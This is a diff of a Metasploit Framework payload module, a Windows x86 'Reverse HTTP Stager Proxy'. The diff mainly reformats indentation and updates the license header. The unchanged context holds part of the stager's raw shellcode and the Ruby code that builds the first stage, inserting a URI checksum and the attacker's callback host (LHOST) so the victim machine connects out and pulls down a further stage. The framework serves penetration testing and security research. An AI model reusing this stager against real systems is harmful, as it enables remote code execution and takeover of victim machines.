@@ -1,10 +1,7 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
-
 
 require 'msf/core'
 require 'msf/core/handler/reverse_http'
@@ -12,31 +9,31 @@ require 'msf/core/handler/reverse_http'
 
 module Metasploit3
 
-	include Msf::Payload::Stager
-	include Msf::Payload::Windows
+  include Msf::Payload::Stager
+  include Msf::Payload::Windows
 
-	def self.handler_type_alias
-		"reverse_http_proxy_pstore"
-	end
+  def self.handler_type_alias
+    "reverse_http_proxy_pstore"
+  end
 
-	def initialize(info = {})
-		super(merge_info(info,
-			'Name'          => 'Reverse HTTP Stager Proxy',
-			'Description'   => 'Tunnel communication over HTTP',
-			'Author'        => 'hdm',
-			'License'       => MSF_LICENSE,
-			'Platform'      => 'win',
-			'Arch'          => ARCH_X86,
-			'Handler'       => Msf::Handler::ReverseHttp,
-			'Convention'    => 'sockedi http',
-			'Stager'        =>
-				{
-					'Offsets' =>
-						{
-							'EXITFUNC' => [ 579, 'V' ],
-							'LPORT'    => [ 499, 'v' ], # Not a typo, really little endian
-						},
-					'Payload' =>
+  def initialize(info = {})
+    super(merge_info(info,
+      'Name'          => 'Reverse HTTP Stager Proxy',
+      'Description'   => 'Tunnel communication over HTTP',
+      'Author'        => 'hdm',
+      'License'       => MSF_LICENSE,
+      'Platform'      => 'win',
+      'Arch'          => ARCH_X86,
+      'Handler'       => Msf::Handler::ReverseHttp,
+      'Convention'    => 'sockedi http',
+      'Stager'        =>
+        {
+          'Offsets' =>
+            {
+              'EXITFUNC' => [ 579, 'V' ],
+              'LPORT'    => [ 499, 'v' ], # Not a typo, really little endian
+            },
+          'Payload' =>
 # Built on Thu Mar  6 02:37:12 2014
 
 # Name: stager_reverse_http_proxy_pstore
@@ -84,31 +81,31 @@ module Metasploit3
 "\x89\xE7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xE2\xFF" +
 "\xD5\x85\xC0\x74\xCD\x8B\x07\x01\xC3\x85\xC0\x75\xE5\x58\xC3\x5E" +
 "\x5E\x5E\x59\x5A\xE8\x60\xFF\xFF\xFF"}
-			))
-	end
+      ))
+  end
 
-	#
-	# Do not transmit the stage over the connection.  We handle this via HTTPS
-	#
-	def stage_over_connection?
-		false
-	end
+  #
+  # Do not transmit the stage over the connection.  We handle this via HTTPS
+  #
+  def stage_over_connection?
+    false
+  end
 
-	#
-	# Generate the first stage
-	#
-	def generate
-		p = super
-		i = p.index("/12345\x00")
-		u = "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW) + "\x00"
-		p[i, u.length] = u
-		p + datastore['LHOST'].to_s + "\x00"
-	end
+  #
+  # Generate the first stage
+  #
+  def generate
+    p = super
+    i = p.index("/12345\x00")
+    u = "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW) + "\x00"
+    p[i, u.length] = u
+    p + datastore['LHOST'].to_s + "\x00"
+  end
 
-	#
-	# Always wait at least 20 seconds for this payload (due to staging delays)
-	#
-	def wfs_delay
-		20
-	end
+  #
+  # Always wait at least 20 seconds for this payload (due to staging delays)
+  #
+  def wfs_delay
+    20
+  end
 end
